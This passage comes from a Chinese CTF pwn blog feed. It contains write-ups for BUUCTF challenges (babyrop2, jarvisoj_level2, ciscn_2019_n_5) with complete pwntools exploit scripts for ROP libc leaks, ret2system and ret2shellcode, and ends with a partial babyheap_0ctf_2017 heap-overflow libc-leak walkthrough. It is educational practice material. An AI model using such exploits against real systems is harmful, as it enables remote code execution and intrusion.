<pre class=" language-assembly"><code class="language-assembly">从第一个到第六个依次保存在rdi，rsi，rdx，rcx，r8，r9。从第7个参数开始，接下来的所有参数都将通过栈传递
</code></pre>
<p>这里我们第一个参数 fmtstr 通过find 字符串格式化</p>
<p></p><p class="code-caption" data-lang="assembly" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-assembly"><code class="language-assembly">gdb-peda$ find %s
Searching for '%s' in: None ranges
Found 292 results, display max 256 items:
  babyrop2 : 0x400790 --> 0xa217325 ('%s!\n')
  babyrop2 : 0x600790 --> 0xa217325 ('%s!\n')
      libc : 0x7ffff7a38860 (<_nl_find_locale+768>:    and    eax,0x397373)
      libc : 0x7ffff7b3d6a7 (<_openchild+23>:    and    eax,0x85fffc73)
      libc : 0x7ffff7b9964a --> 0x72740a000a0a7325 ('%s\n\n')
      libc : 0x7ffff7b99666 --> 0x617473000a0a7325 ('%s\n\n')
      libc : 0x7ffff7b99d93 ("%s%s%s%s%s%s%s%s%s%s\n")
      libc : 0x7ffff7b99d95 ("%s%s%s%s%s%s%s%s%s\n")
      libc : 0x7ffff7b99d97 ("%s%s%s%s%s%s%s%s\n")
      libc : 0x7ffff7b99d99 ("%s%s%s%s%s%s%s\n")
      libc : 0x7ffff7b99d9b ("%s%s%s%s%s%s\n")
      libc : 0x7ffff7b99d9d ("%s%s%s%s%s\n")
      libc : 0x7ffff7b99d9f ("%s%s%s%s\n")
      libc : 0x7ffff7b99da1 --> 0xa732573257325 ('%s%s%s\n')
      libc : 0x7ffff7b99da3 --> 0x4e49000a73257325 ('%s%s\n')
      libc : 0x7ffff7b99da5 --> 0x4f464e49000a7325 ('%s\n')
      libc : 0x7ffff7b99e44 ("%s%sUnknown signal %d\n")
      libc : 0x7ffff7b99e46 ("%sUnknown signal %d\n")
      libc : 0x7ffff7b99f0c ("%s%ssignal %d\n")
      libc : 0x7ffff7b99f0e ("%ssignal %d\n")
      libc : 0x7ffff7b99f4d --> 0x5d70255b00207325 ('%s ')
      libc : 0x7ffff7b99f6f --> 0x6375530028207325 ('%s (')
      libc : 0x7ffff7b9af41 ("%s%s%s[%p] ")
      libc : 0x7ffff7b9af43 ("%s%s[%p] ")
--More--(25/257)
</code></pre>
<p>发现程序中存在%s 那我们就利用%s获取</p>
<p>接着需要传入格式化的值通过顺位第二个寄存器rsi存入read_got</p>
<p>接着ret到printf_plt即可完成泄漏</p>
<p>后续就是计算system与binsh addr getshell</p>
<h4 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span> 

p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./babyrop2'</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'babyrop2'</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
printf_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
read_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
pop_rdi<span class="token operator">=</span><span class="token number">0x0000000000400733</span><span class="token comment" spellcheck="true"># : pop rdi ; ret</span>
pop_rsi<span class="token operator">=</span><span class="token number">0x0000000000400731</span><span class="token comment" spellcheck="true"># : pop rsi ; pop r15 ; ret</span>
fmt<span class="token operator">=</span><span class="token number">0x400790</span>
main<span class="token operator">=</span><span class="token number">0x400636</span>
payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fmt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

read<span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">26</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span> hex<span class="token punctuation">(</span>read<span class="token punctuation">)</span>
system<span class="token operator">=</span>read<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
sh<span class="token operator">=</span>read<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token operator">+</span>next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
payload1<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h1><p>这题不多说了 之前也是做过的 直接getshell就好</p>
<h4 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'level2'</span><span class="token punctuation">)</span>
system<span class="token operator">=</span><span class="token number">0x8048320</span>
sh<span class="token operator">=</span><span class="token number">0x804A024</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><p>基本栈溢出 ret_shellcode</p>
<p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/APwn/buuctf$ checksec ciscn_2019_n_5
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/APwn/buuctf/ciscn_2019_n_5'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
    RWX:      Has RWX segments
ios@ubuntu:~/APwn/buuctf$
</code></pre>
<p>保护全关 </p>
<p>exp</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#p=process('./ciscn_2019_n_5')</span>
p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25965</span><span class="token punctuation">)</span>
sh<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What do you want to say to me?'</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x601080</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;OGeek2019-babyrop&quot;&gt;&lt;a href=&quot;#OGeek2019-babyrop&quot; class=&quot;headerlink&quot; title=&quot;[OGeek2019]babyrop&quot;&gt;&lt;/a&gt;[OGeek2019]babyrop&lt;/h1&gt;&lt;h4 id=&quot;检查保
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>babyheap_0ctf_2017</title>
    <link href="http://iosmosis.github.io/2019/09/13/babyheap-0ctf-2017/"/>
    <id>http://iosmosis.github.io/2019/09/13/babyheap-0ctf-2017/</id>
    <published>2019-09-13T09:09:45.000Z</published>
    <updated>2019-09-13T11:20:43.043Z</updated>
    
    <content type="html"><![CDATA[<p>新的开始、只记录遇到题目的问题以及解决方法。</p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>通过分析源码可以知道</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_E7F</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  result <span class="token operator">=</span> <span class="token function">sub_138C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//read</span>
  v2 <span class="token operator">=</span> result<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>result <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0LL</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    result <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      result <span class="token operator">=</span> <span class="token function">sub_138C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      v3 <span class="token operator">=</span> result<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        result <span class="token operator">=</span> <span class="token function">sub_11B2</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">24LL</span> <span class="token operator">*</span> v2 <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>先读入idx、判断idx是否创建，如果创建则提示输入size。</p>
<p>判断输入的size是否大于0 但是没有和当前idx的size做比较导致，这里的size可控，可以写入比申请chunk时更大的size。</p>
<p>content的输入大小和当前输入的size同大小。</p>
<p>所以这里存在堆溢出。可以覆盖数据到其他堆块。</p>
<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/APwn/buuctf/babyheap_0ctf_2017'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre>
<p>​    开启了PIE</p>
<p>需要leak libc_base</p>
<h2 id="Leak-Libc-base"><a href="#Leak-Libc-base" class="headerlink" title="Leak Libc_base"></a>Leak Libc_base</h2><p>因为存在堆溢出 可以通过溢出伪造一个fake_small_chunk，接着申请一个smallchuank，利用fake_small_chunk 包含smallchuank头部以及fd bk ，利用dump函数即可获取main_arena地址</p>
<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx=0</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx=1</span>
</code></pre>
<p>通过Fill溢出chunk0 修改fastbin chunk1 的size为small chunk size  </p>
<p>包含chunk head size =0x71 ，chunk大小=0x60</p>
<p>修改前堆块分布</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ heap
0x558240ff2000 FASTBIN <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0x0, 
  size <span class="token operator">=</span> 0x71, 
  fd <span class="token operator">=</span> 0x0, 
  bk <span class="token operator">=</span> 0x0, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
0x558240ff2070 FASTBIN <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0x0, 
  size <span class="token operator">=</span> 0x41, //修改前size（包含chunk head）
  fd <span class="token operator">=</span> 0x0, 
  bk <span class="token operator">=</span> 0x0, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
0x558240ff20b0 PREV_INUSE <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0x0, 
  size <span class="token operator">=</span> 0x20f51, 
  fd <span class="token operator">=</span> 0x0, 
  bk <span class="token operator">=</span> 0x0, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
</code></pre>
<p>修改后堆块分布</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">Fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ heap
0x557fb7f39000 FASTBIN <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0x0, 
  size <span class="token operator">=</span> 0x71, 
  fd <span class="token operator">=</span> 0x6161616161616161, 
  bk <span class="token operator">=</span> 0x6161616161616161, 
  fd_nextsize <span class="token operator">=</span> 0x6161616161616161, 
  bk_nextsize <span class="token operator">=</span> 0x6161616161616161
<span class="token punctuation">}</span>
0x557fb7f39070 FASTBIN <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0x0, 
  size <span class="token operator">=</span> 0x71,  //这里通过溢出上面的chunk 修改了此处的size
  fd <span class="token operator">=</span> 0x0, 
  bk <span class="token operator">=</span> 0x0, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
0x557fb7f390e0 <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> 0x0, 
  size <span class="token operator">=</span> 0x0, 
  fd <span class="token operator">=</span> 0x0, 
  bk <span class="token operator">=</span> 0x0, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
gdb-peda$ 
<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data-lang<span class="token operator">=</span><span class="token string">""</span> data-line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data-trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data-label_position<span class="token operator">=</span><span class="token string">"outer"</span> data-labels_left<span class="token operator">=</span><span class="token string">""</span> data-labels_right<span class="token operator">=</span><span class="token string">""</span> data-labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span>/span<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span>
</code></pre>
<p>接着申请一块small_chunk 并且为了满足check需求，需要在chunk2 内容做处理，因为chunk1 原本大小为0x41 现在我们修改了大小为0x71 所以还缺少0x30 size。chunk2_head包含了0x10剩下的0x20由chunk2_content补充</p>
<p>我们修改chunk2 内容 前0x20为任意数据 ，补充到fake的chunk1的content里，接着伪造一个prev_size 以及 next_size （过fastbin check）</p>
<p>此处next_size 为了构成fastbin循环链表需要满足等于第一次申请的chunk0 size，所以next_size=chunk0_size =0x71</p>
<pre class=" language-python"><code class="language-python">Allocate<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx=2</span>
Fill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>伪造好堆块将堆块free掉 使fake chunk成为real chunk，</p>
<p>重新分配fake_chunk_size(0x60)</p>
<p>因为fake_chunk占用了chunk2_head（0x10），占用了chunk2_content(0x20)</p>
<p>所以重新分配时会清空这些部分（calloc特性 分配堆块时 会先清空该chunk）</p>
<p>重新分配，接着因为我们的small_chunk(chunk2)的头部被清空了 所以破坏了原本的堆结构，我们需要通过溢出chunk1(0x40),修改回原chunk2 head 以及size</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">Free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token operator">//</span>重新申请
Fill<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x111</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">//</span>溢出chunk1 修改chunk2头部信息
</code></pre>
<p>查看当前堆块布局</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ x/40gx 0x55a7bccd2070
0x55a7bccd2070:    0x0000000000000000    0x0000000000000071  //chunk1
0x55a7bccd2080:    0x6161616161616161    0x6161616161616161
0x55a7bccd2090:    0x6161616161616161    0x6161616161616161
0x55a7bccd20a0:    0x6161616161616161    0x6161616161616161
0x55a7bccd20b0:    0x0000000000000000    0x0000000000000111  //chunk2
0x55a7bccd20c0:    0x0000000000000000    0x0000000000000000
0x55a7bccd20d0:    0x0000000000000000    0x0000000000000000
0x55a7bccd20e0:    0x0000000000000000    0x0000000000000071  
0x55a7bccd20f0:    0x0000000000000000    0x0000000000000000
0x55a7bccd2100:    0x0000000000000000    0x0000000000000000
0x55a7bccd2110:    0x0000000000000000    0x0000000000000000
0x55a7bccd2120:    0x0000000000000000    0x0000000000000000
0x55a7bccd2130:    0x0000000000000000    0x0000000000000000
0x55a7bccd2140:    0x0000000000000000    0x0000000000000000
0x55a7bccd2150:    0x0000000000000000    0x0000000000000000
0x55a7bccd2160:    0x0000000000000000    0x0000000000000000
0x55a7bccd2170:    0x0000000000000000    0x0000000000000000
0x55a7bccd2180:    0x0000000000000000    0x0000000000000000
0x55a7bccd2190:    0x0000000000000000    0x0000000000000000
0x55a7bccd21a0:    0x0000000000000000    0x0000000000000000
</code></pre>
<p>根据small_bin特性，只存在一块时，free掉时指向top_chunk =&gt; main_arena+0x58处</p>
<p>所以尝试利用Free函数free掉该small_chunk（chunk2）</p>
<p>注意：free chunk2时需要再申请一个chunk （方式与top chunk 合并）</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">Allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token operator">//</span>防止合并
Free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
</code></pre>
<p>查看当前堆布局</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ bins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x55bca862b0b0 —▸ 0x7fd682405b78 <span class="token punctuation">(</span>main_arena+88<span class="token punctuation">)</span> ◂— 0x55bca862b0b0
smallbins
empty
largebins
empty
gdb-peda$ x/20gx 0x55bca862b070
0x55bca862b070:    0x0000000000000000    0x0000000000000071 chunk1
0x55bca862b080:    0x6161616161616161    0x6161616161616161
0x55bca862b090:    0x6161616161616161    0x6161616161616161
0x55bca862b0a0:    0x6161616161616161    0x6161616161616161
0x55bca862b0b0:    0x0000000000000000    0x0000000000000111//chunk2
0x55bca862b0c0:    0x00007fd682405b78    0x00007fd682405b78
0x55bca862b0d0:    0x0000000000000000    0x0000000000000000
0x55bca862b0e0:    0x0000000000000000    0x0000000000000071
0x55bca862b0f0:    0x0000000000000000    0x0000000000000000
0x55bca862b100:    0x0000000000000000    0x0000000000000000
gdb-peda$
</code></pre>
<p>可以看到当前chunk2 分fd bk 都指向main_arena+88处 </p>
<p>接着打印当前fake_chunk1  由于fake_chunk原大小为0x30 所以dump fake_chunk时会打印出chunk2 head 、chunk2 size、chunk2 fd bk 。</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">print</span> Dump<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#print hexDump(1)[:-8]</span>
leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>Dump<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x58</span>
<span class="token keyword">print</span> <span class="token string">"leak:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>
</code></pre>
<pre class=" language-bash"><code class="language-bash">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x00\x00\x00\x11\x00\x00\x00x��<span class="token punctuation">[</span>\\x7f\x00x��<span class="token punctuation">[</span>\\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00

<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x2 bytes:
    <span class="token string">'4\n'</span>
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x7 bytes:
    <span class="token string">'Index: '</span>
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x2 bytes:
    <span class="token string">'1\n'</span>
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0xa0 bytes:
    00000000  43 6f 6e 74  65 6e 74 3a  20 0a 61 61  61 61 61 61  │Cont│ent:│ ·aa│aaaa│
    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000030  61 61 61 61  61 61 61 61  61 61 00 00  00 00 00 00  │aaaa│aaaa│aa··│····│
